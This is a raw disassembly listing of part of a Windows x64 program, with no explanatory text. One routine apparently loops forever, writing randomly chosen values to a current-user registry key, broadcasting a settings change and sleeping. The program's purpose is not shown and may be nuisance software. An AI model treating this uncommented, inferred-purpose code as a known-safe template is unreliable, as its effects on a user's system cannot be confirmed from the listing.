   140003473:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   140003477:	74 0a                	je     0x140003483
   140003479:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000347e:	e8 ed 2e 00 00       	call   0x140006370
   140003483:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003488:	ff 15 e2 5c 00 00    	call   *0x5ce2(%rip)        # 0x140009170
   14000348e:	90                   	nop
   14000348f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003494:	ff 15 b6 5c 00 00    	call   *0x5cb6(%rip)        # 0x140009150
   14000349a:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   14000349e:	ff 15 d4 5c 00 00    	call   *0x5cd4(%rip)        # 0x140009178
   1400034a4:	90                   	nop
   1400034a5:	48 2b f3             	sub    %rbx,%rsi
   1400034a8:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   1400034af:	72 1c                	jb     0x1400034cd
   1400034b1:	48 83 c6 27          	add    $0x27,%rsi
   1400034b5:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400034b9:	48 2b d8             	sub    %rax,%rbx
   1400034bc:	48 83 eb 08          	sub    $0x8,%rbx
   1400034c0:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400034c4:	0f 87 2a 01 00 00    	ja     0x1400035f4
   1400034ca:	48 8b d8             	mov    %rax,%rbx
   1400034cd:	48 8b d6             	mov    %rsi,%rdx
   1400034d0:	48 8b cb             	mov    %rbx,%rcx
   1400034d3:	e8 48 38 00 00       	call   0x140006d20
   1400034d8:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   1400034df:	48 33 cc             	xor    %rsp,%rcx
   1400034e2:	e8 19 38 00 00       	call   0x140006d00
   1400034e7:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   1400034ee:	00 
   1400034ef:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400034f3:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400034f7:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1400034fb:	4d 8b 63 38          	mov    0x38(%r11),%r12
   1400034ff:	49 8b e3             	mov    %r11,%rsp
   140003502:	41 5f                	pop    %r15
   140003504:	41 5e                	pop    %r14
   140003506:	5d                   	pop    %rbp
   140003507:	c3                   	ret
   140003508:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000350d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003511:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003516:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000351b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000351f:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003525:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003529:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000352e:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003533:	74 28                	je     0x14000355d
   140003535:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003539:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000353e:	48 39 08             	cmp    %rcx,(%rax)
   140003541:	75 1a                	jne    0x14000355d
   140003543:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003547:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000354b:	48 89 08             	mov    %rcx,(%rax)
   14000354e:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140003552:	48 89 08             	mov    %rcx,(%rax)
   140003555:	2b d1                	sub    %ecx,%edx
   140003557:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   14000355b:	89 10                	mov    %edx,(%rax)
   14000355d:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   140003561:	74 0a                	je     0x14000356d
   140003563:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003568:	e8 03 2e 00 00       	call   0x140006370
   14000356d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003572:	ff 15 f8 5b 00 00    	call   *0x5bf8(%rip)        # 0x140009170
   140003578:	90                   	nop
   140003579:	e9 11 ff ff ff       	jmp    0x14000348f
   14000357e:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003583:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003587:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   14000358c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003591:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003595:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   14000359b:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   14000359f:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1400035a4:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   1400035a9:	74 28                	je     0x1400035d3
   1400035ab:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   1400035af:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400035b4:	48 39 08             	cmp    %rcx,(%rax)
   1400035b7:	75 1a                	jne    0x1400035d3
   1400035b9:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400035bd:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400035c1:	48 89 08             	mov    %rcx,(%rax)
   1400035c4:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1400035c8:	48 89 08             	mov    %rcx,(%rax)
   1400035cb:	2b d1                	sub    %ecx,%edx
   1400035cd:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   1400035d1:	89 10                	mov    %edx,(%rax)
   1400035d3:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   1400035d7:	74 0a                	je     0x1400035e3
   1400035d9:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035de:	e8 8d 2d 00 00       	call   0x140006370
   1400035e3:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035e8:	ff 15 82 5b 00 00    	call   *0x5b82(%rip)        # 0x140009170
   1400035ee:	90                   	nop
   1400035ef:	e9 9b fe ff ff       	jmp    0x14000348f
   1400035f4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400035fb:	00 00 
   1400035fd:	45 33 c9             	xor    %r9d,%r9d
   140003600:	45 33 c0             	xor    %r8d,%r8d
   140003603:	33 d2                	xor    %edx,%edx
   140003605:	33 c9                	xor    %ecx,%ecx
   140003607:	ff 15 33 5f 00 00    	call   *0x5f33(%rip)        # 0x140009540
   14000360d:	cc                   	int3
   14000360e:	cc                   	int3
   14000360f:	cc                   	int3
   140003610:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003615:	57                   	push   %rdi
   140003616:	48 83 ec 20          	sub    $0x20,%rsp
   14000361a:	48 8d b9 a8 00 00 00 	lea    0xa8(%rcx),%rdi
   140003621:	48 8b 01             	mov    (%rcx),%rax
   140003624:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003628:	48 8d 05 79 6b 00 00 	lea    0x6b79(%rip),%rax        # 0x14000a1a8
   14000362f:	48 89 84 3a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rdi,1)
   140003636:	ff 
   140003637:	48 8b 01             	mov    (%rcx),%rax
   14000363a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000363e:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003644:	89 94 39 54 ff ff ff 	mov    %edx,-0xac(%rcx,%rdi,1)
   14000364b:	48 8d 9f 60 ff ff ff 	lea    -0xa0(%rdi),%rbx
   140003652:	48 8d 05 cf 6a 00 00 	lea    0x6acf(%rip),%rax        # 0x14000a128
   140003659:	48 89 03             	mov    %rax,(%rbx)
   14000365c:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140003663:	00 
   140003664:	74 2f                	je     0x140003695
   140003666:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000366a:	48 8d 43 70          	lea    0x70(%rbx),%rax
   14000366e:	48 39 01             	cmp    %rax,(%rcx)
   140003671:	75 22                	jne    0x140003695
   140003673:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   14000367a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140003681:	48 89 11             	mov    %rdx,(%rcx)
   140003684:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140003688:	48 89 10             	mov    %rdx,(%rax)
   14000368b:	44 2b c2             	sub    %edx,%r8d
   14000368e:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140003692:	44 89 00             	mov    %r8d,(%rax)
   140003695:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140003699:	74 08                	je     0x1400036a3
   14000369b:	48 8b cb             	mov    %rbx,%rcx
   14000369e:	e8 cd 2c 00 00       	call   0x140006370
   1400036a3:	48 8b cb             	mov    %rbx,%rcx
   1400036a6:	ff 15 c4 5a 00 00    	call   *0x5ac4(%rip)        # 0x140009170
   1400036ac:	90                   	nop
   1400036ad:	48 8d 8f 68 ff ff ff 	lea    -0x98(%rdi),%rcx
   1400036b4:	ff 15 96 5a 00 00    	call   *0x5a96(%rip)        # 0x140009150
   1400036ba:	48 8b cf             	mov    %rdi,%rcx
   1400036bd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400036c2:	48 83 c4 20          	add    $0x20,%rsp
   1400036c6:	5f                   	pop    %rdi
   1400036c7:	48 ff 25 aa 5a 00 00 	rex.W jmp *0x5aaa(%rip)        # 0x140009178
   1400036ce:	cc                   	int3
   1400036cf:	cc                   	int3
   1400036d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400036d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400036da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400036df:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400036e4:	41 56                	push   %r14
   1400036e6:	b8 20 14 00 00       	mov    $0x1420,%eax
   1400036eb:	e8 60 3b 00 00       	call   0x140007250
   1400036f0:	48 2b e0             	sub    %rax,%rsp
   1400036f3:	48 8b 05 46 a9 00 00 	mov    0xa946(%rip),%rax        # 0x14000e040
   1400036fa:	48 33 c4             	xor    %rsp,%rax
   1400036fd:	48 89 84 24 10 14 00 	mov    %rax,0x1410(%rsp)
   140003704:	00 
   140003705:	66 0f 6f 05 f3 6a 00 	movdqa 0x6af3(%rip),%xmm0        # 0x14000a200
   14000370c:	00 
   14000370d:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   140003713:	c7 44 24 60 c0 00 00 	movl   $0xc0,0x60(%rsp)
   14000371a:	00 
   14000371b:	ff 15 bf 5a 00 00    	call   *0x5abf(%rip)        # 0x1400091e0
   140003721:	c7 84 24 04 14 00 00 	movl   $0xffffffff,0x1404(%rsp)
   140003728:	ff ff ff ff 
   14000372c:	ba 01 00 00 00       	mov    $0x1,%edx
   140003731:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   140003738:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000373f:	00 
   140003740:	8b c8                	mov    %eax,%ecx
   140003742:	c1 e9 1e             	shr    $0x1e,%ecx
   140003745:	33 c8                	xor    %eax,%ecx
   140003747:	69 c1 65 89 07 6c    	imul   $0x6c078965,%ecx,%eax
   14000374d:	03 c2                	add    %edx,%eax
   14000374f:	89 84 94 84 00 00 00 	mov    %eax,0x84(%rsp,%rdx,4)
   140003756:	48 ff c2             	inc    %rdx
   140003759:	48 81 fa 70 02 00 00 	cmp    $0x270,%rdx
   140003760:	72 de                	jb     0x140003740
   140003762:	c7 84 24 80 00 00 00 	movl   $0x270,0x80(%rsp)
   140003769:	70 02 00 00 
   14000376d:	33 ed                	xor    %ebp,%ebp
   14000376f:	41 be 00 00 00 80    	mov    $0x80000000,%r14d
   140003775:	48 bf ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rdi
   14000377c:	ff ff 7f 
   14000377f:	be 00 5e d0 b2       	mov    $0xb2d05e00,%esi
   140003784:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000378b:	ff ff 7f 
   14000378e:	66 90                	xchg   %ax,%ax
   140003790:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140003797:	00 
   140003798:	e8 d3 31 00 00       	call   0x140006970
   14000379d:	8b c8                	mov    %eax,%ecx
   14000379f:	48 8d 04 89          	lea    (%rcx,%rcx,4),%rax
   1400037a3:	85 c0                	test   %eax,%eax
   1400037a5:	75 21                	jne    0x1400037c8
   1400037a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400037ae:	00 00 
   1400037b0:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1400037b7:	00 
   1400037b8:	e8 b3 31 00 00       	call   0x140006970
   1400037bd:	8b c8                	mov    %eax,%ecx
   1400037bf:	48 8d 04 89          	lea    (%rcx,%rcx,4),%rax
   1400037c3:	83 f8 01             	cmp    $0x1,%eax
   1400037c6:	72 e8                	jb     0x1400037b0
   1400037c8:	48 c1 e8 20          	shr    $0x20,%rax
   1400037cc:	48 8d 15 cd 64 00 00 	lea    0x64cd(%rip),%rdx        # 0x140009ca0
   1400037d3:	49 2b c6             	sub    %r14,%rax
   1400037d6:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400037dc:	48 35 00 00 00 80    	xor    $0xffffffff80000000,%rax
   1400037e2:	45 33 c0             	xor    %r8d,%r8d
   1400037e5:	8b 4c 84 50          	mov    0x50(%rsp,%rax,4),%ecx
   1400037e9:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   1400037ee:	89 4c 24 70          	mov    %ecx,0x70(%rsp)
   1400037f2:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   1400037f9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400037fe:	ff 15 04 58 00 00    	call   *0x5804(%rip)        # 0x140009008
   140003804:	85 c0                	test   %eax,%eax
   140003806:	75 67                	jne    0x14000386f
   140003808:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000380d:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140003812:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003819:	00 
   14000381a:	48 8d 15 af 64 00 00 	lea    0x64af(%rip),%rdx        # 0x140009cd0
   140003821:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003827:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000382c:	45 33 c0             	xor    %r8d,%r8d
   14000382f:	ff 15 db 57 00 00    	call   *0x57db(%rip)        # 0x140009010
   140003835:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000383a:	ff 15 c0 57 00 00    	call   *0x57c0(%rip)        # 0x140009000
   140003840:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003845:	4c 8d 0d 9c 64 00 00 	lea    0x649c(%rip),%r9        # 0x140009ce8
   14000384c:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140003853:	00 
   140003854:	45 33 c0             	xor    %r8d,%r8d
   140003857:	ba 1a 00 00 00       	mov    $0x1a,%edx
   14000385c:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140003863:	00 
   140003864:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   140003869:	ff 15 a9 5a 00 00    	call   *0x5aa9(%rip)        # 0x140009318
   14000386f:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003874:	e8 a7 d7 ff ff       	call   0x140001020
   140003879:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000387e:	48 3b c7             	cmp    %rdi,%rax
   140003881:	7d 18                	jge    0x14000389b
   140003883:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
   140003887:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000388c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003891:	e8 0a 27 00 00       	call   0x140005fa0
   140003896:	e9 f5 fe ff ff       	jmp    0x140003790
   14000389b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400038a0:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400038a5:	e8 f6 26 00 00       	call   0x140005fa0
   1400038aa:	e9 e1 fe ff ff       	jmp    0x140003790
   1400038af:	cc                   	int3
   1400038b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400038b5:	55                   	push   %rbp
   1400038b6:	48 8d ac 24 60 ff ff 	lea    -0xa0(%rsp),%rbp
   1400038bd:	ff 
   1400038be:	48 81 ec a0 01 00 00 	sub    $0x1a0,%rsp
   1400038c5:	48 8b 05 74 a7 00 00 	mov    0xa774(%rip),%rax        # 0x14000e040
   1400038cc:	48 33 c4             	xor    %rsp,%rax
   1400038cf:	48 89 85 90 00 00 00 	mov    %rax,0x90(%rbp)
   1400038d6:	33 db                	xor    %ebx,%ebx
   1400038d8:	33 d2                	xor    %edx,%edx
   1400038da:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   1400038e0:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1400038e4:	e8 a9 42 00 00       	call   0x140007b92
   1400038e9:	41 b8 12 00 00 00    	mov    $0x12,%r8d
   1400038ef:	48 8d 15 c2 64 00 00 	lea    0x64c2(%rip),%rdx        # 0x140009db8
   1400038f6:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1400038fa:	e8 01 16 00 00       	call   0x140004f00
   1400038ff:	90                   	nop
   140003900:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   140003904:	e8 b7 12 00 00       	call   0x140004bc0
   140003909:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   14000390d:	e8 5e 2a 00 00       	call   0x140006370
   140003912:	48 85 c0             	test   %rax,%rax
   140003915:	75 1d                	jne    0x140003934
   140003917:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   14000391b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000391f:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   140003923:	48 03 c8             	add    %rax,%rcx
   140003926:	45 33 c0             	xor    %r8d,%r8d
   140003929:	ba 02 00 00 00       	mov    $0x2,%edx
   14000392e:	ff 15 14 59 00 00    	call   *0x5914(%rip)        # 0x140009248
   140003934:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003937:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   14000393c:	66 0f 6f 0d 9c 68 00 	movdqa 0x689c(%rip),%xmm1        # 0x14000a1e0
   140003943:	00 
   140003944:	f3 0f 7f 4c 24 68    	movdqu %xmm1,0x68(%rsp)
   14000394a:	8b 05 a4 67 00 00    	mov    0x67a4(%rip),%eax        # 0x14000a0f4
   140003950:	66 89 44 24 58       	mov    %ax,0x58(%rsp)
   140003955:	0f b6 05 9a 67 00 00 	movzbl 0x679a(%rip),%eax        # 0x14000a0f6
   14000395c:	88 44 24 5a          	mov    %al,0x5a(%rsp)
   140003960:	c6 44 24 5b 00       	movb   $0x0,0x5b(%rsp)
   140003965:	48 c7 44 24 20 1d 00 	movq   $0x1d,0x20(%rsp)
   14000396c:	00 00 
   14000396e:	ba 1d 00 00 00       	mov    $0x1d,%edx
   140003973:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003978:	e8 63 2c 00 00       	call   0x1400065e0
   14000397d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003980:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140003985:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003988:	f3 0f 7f 4c 24 40    	movdqu %xmm1,0x40(%rsp)
   14000398e:	0f 10 00             	movups (%rax),%xmm0
   140003991:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140003996:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000399a:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   14000399f:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1400039a3:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   1400039aa:	00 
   1400039ab:	c6 00 00             	movb   $0x0,(%rax)
   1400039ae:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400039b3:	48 83 7c 24 48 0f    	cmpq   $0xf,0x48(%rsp)
   1400039b9:	4c 0f 47 4c 24 30    	cmova  0x30(%rsp),%r9
   1400039bf:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400039c3:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400039c8:	4c 8d 05 29 67 00 00 	lea    0x6729(%rip),%r8        # 0x14000a0f8
   1400039cf:	48 8d 15 2a 67 00 00 	lea    0x672a(%rip),%rdx        # 0x14000a100
   1400039d6:	33 c9                	xor    %ecx,%ecx
   1400039d8:	ff 15 e2 58 00 00    	call   *0x58e2(%rip)        # 0x1400092c0
   1400039de:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400039e3:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400039e7:	76 44                	jbe    0x140003a2d
   1400039e9:	48 ff c2             	inc    %rdx
   1400039ec:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400039f1:	48 8b c1             	mov    %rcx,%rax
   1400039f4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400039fb:	72 2b                	jb     0x140003a28
   1400039fd:	48 83 c2 27          	add    $0x27,%rdx
   140003a01:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003a05:	48 2b c1             	sub    %rcx,%rax
   140003a08:	48 83 e8 08          	sub    $0x8,%rax
   140003a0c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003a10:	76 16                	jbe    0x140003a28
   140003a12:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003a17:	45 33 c9             	xor    %r9d,%r9d
   140003a1a:	45 33 c0             	xor    %r8d,%r8d
   140003a1d:	33 d2                	xor    %edx,%edx
   140003a1f:	33 c9                	xor    %ecx,%ecx
   140003a21:	ff 15 19 5b 00 00    	call   *0x5b19(%rip)        # 0x140009540
   140003a27:	cc                   	int3
   140003a28:	e8 f3 32 00 00       	call   0x140006d20
   140003a2d:	66 0f 6f 05 9b 67 00 	movdqa 0x679b(%rip),%xmm0        # 0x14000a1d0
   140003a34:	00 
   140003a35:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   140003a3b:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   140003a40:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140003a45:	48 83 fa 0f          	cmp    $0xf,%rdx
   140003a49:	76 45                	jbe    0x140003a90
   140003a4b:	48 ff c2             	inc    %rdx
   140003a4e:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140003a53:	48 8b c1             	mov    %rcx,%rax
   140003a56:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003a5d:	72 2b                	jb     0x140003a8a
   140003a5f:	48 83 c2 27          	add    $0x27,%rdx
   140003a63:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003a67:	48 2b c1             	sub    %rcx,%rax
   140003a6a:	48 83 e8 08          	sub    $0x8,%rax
   140003a6e:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003a72:	76 16                	jbe    0x140003a8a
   140003a74:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003a79:	45 33 c9             	xor    %r9d,%r9d
   140003a7c:	45 33 c0             	xor    %r8d,%r8d
   140003a7f:	33 d2                	xor    %edx,%edx
   140003a81:	33 c9                	xor    %ecx,%ecx
   140003a83:	ff 15 b7 5a 00 00    	call   *0x5ab7(%rip)        # 0x140009540
   140003a89:	cc                   	int3
   140003a8a:	e8 91 32 00 00       	call   0x140006d20
   140003a8f:	90                   	nop
   140003a90:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   140003a94:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003a98:	48 8d 05 09 67 00 00 	lea    0x6709(%rip),%rax        # 0x14000a1a8
   140003a9f:	48 89 44 0d 80       	mov    %rax,-0x80(%rbp,%rcx,1)
   140003aa4:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   140003aa8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003aac:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003ab2:	89 54 0c 7c          	mov    %edx,0x7c(%rsp,%rcx,1)
   140003ab6:	48 8d 05 6b 66 00 00 	lea    0x666b(%rip),%rax        # 0x14000a128
   140003abd:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   140003ac1:	48 83 7d 08 00       	cmpq   $0x0,0x8(%rbp)
   140003ac6:	74 27                	je     0x140003aef
   140003ac8:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140003acc:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   140003ad0:	48 39 08             	cmp    %rcx,(%rax)
   140003ad3:	75 1a                	jne    0x140003aef
   140003ad5:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140003ad9:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   140003add:	48 89 08             	mov    %rcx,(%rax)
   140003ae0:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   140003ae4:	48 89 08             	mov    %rcx,(%rax)
   140003ae7:	2b d1                	sub    %ecx,%edx
   140003ae9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140003aed:	89 10                	mov    %edx,(%rax)
   140003aef:	80 7d 04 00          	cmpb   $0x0,0x4(%rbp)
   140003af3:	74 09                	je     0x140003afe
   140003af5:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   140003af9:	e8 72 28 00 00       	call   0x140006370
   140003afe:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   140003b02:	ff 15 68 56 00 00    	call   *0x5668(%rip)        # 0x140009170
   140003b08:	90                   	nop
   140003b09:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140003b0d:	ff 15 3d 56 00 00    	call   *0x563d(%rip)        # 0x140009150
   140003b13:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   140003b17:	ff 15 5b 56 00 00    	call   *0x565b(%rip)        # 0x140009178
   140003b1d:	33 c0                	xor    %eax,%eax
   140003b1f:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140003b26:	48 33 cc             	xor    %rsp,%rcx
   140003b29:	e8 d2 31 00 00       	call   0x140006d00
   140003b2e:	48 8b 9c 24 b0 01 00 	mov    0x1b0(%rsp),%rbx
   140003b35:	00 
   140003b36:	48 81 c4 a0 01 00 00 	add    $0x1a0,%rsp
   140003b3d:	5d                   	pop    %rbp
   140003b3e:	c3                   	ret
   140003b3f:	cc                   	int3
   140003b40:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003b45:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003b4a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003b4f:	55                   	push   %rbp
   140003b50:	41 56                	push   %r14
   140003b52:	41 57                	push   %r15
   140003b54:	48 8d ac 24 10 f6 ff 	lea    -0x9f0(%rsp),%rbp
   140003b5b:	ff 
   140003b5c:	48 81 ec f0 0a 00 00 	sub    $0xaf0,%rsp
   140003b63:	48 8b 05 d6 a4 00 00 	mov    0xa4d6(%rip),%rax        # 0x14000e040
   140003b6a:	48 33 c4             	xor    %rsp,%rax
   140003b6d:	48 89 85 e0 09 00 00 	mov    %rax,0x9e0(%rbp)
   140003b74:	48 8b d9             	mov    %rcx,%rbx
   140003b77:	33 c9                	xor    %ecx,%ecx
   140003b79:	ff 15 61 5a 00 00    	call   *0x5a61(%rip)        # 0x1400095e0
   140003b7f:	8b c8                	mov    %eax,%ecx
   140003b81:	ff 15 69 5a 00 00    	call   *0x5a69(%rip)        # 0x1400095f0
   140003b87:	8b 05 7b 65 00 00    	mov    0x657b(%rip),%eax        # 0x14000a108
   140003b8d:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003b91:	89 85 90 01 00 00    	mov    %eax,0x190(%rbp)
   140003b97:	33 f6                	xor    %esi,%esi
   140003b99:	0f b7 05 6c 65 00 00 	movzwl 0x656c(%rip),%eax        # 0x14000a10c
   140003ba0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003ba3:	66 89 85 94 01 00 00 	mov    %ax,0x194(%rbp)
   140003baa:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003bad:	48 8d 05 8c e2 ff ff 	lea    -0x1d74(%rip),%rax        # 0x140001e40
   140003bb4:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
   140003bb8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140003bbc:	48 8d 85 90 01 00 00 	lea    0x190(%rbp),%rax
   140003bc3:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140003bc7:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
   140003bcb:	66 0f 7f 45 00       	movdqa %xmm0,0x0(%rbp)
   140003bd0:	66 0f 7f 4d 10       	movdqa %xmm1,0x10(%rbp)
   140003bd5:	48 89 5d f8          	mov    %rbx,-0x8(%rbp)
   140003bd9:	ff 15 e1 57 00 00    	call   *0x57e1(%rip)        # 0x1400093c0
   140003bdf:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140003be4:	4c 8d 05 25 65 00 00 	lea    0x6525(%rip),%r8        # 0x14000a110
   140003beb:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
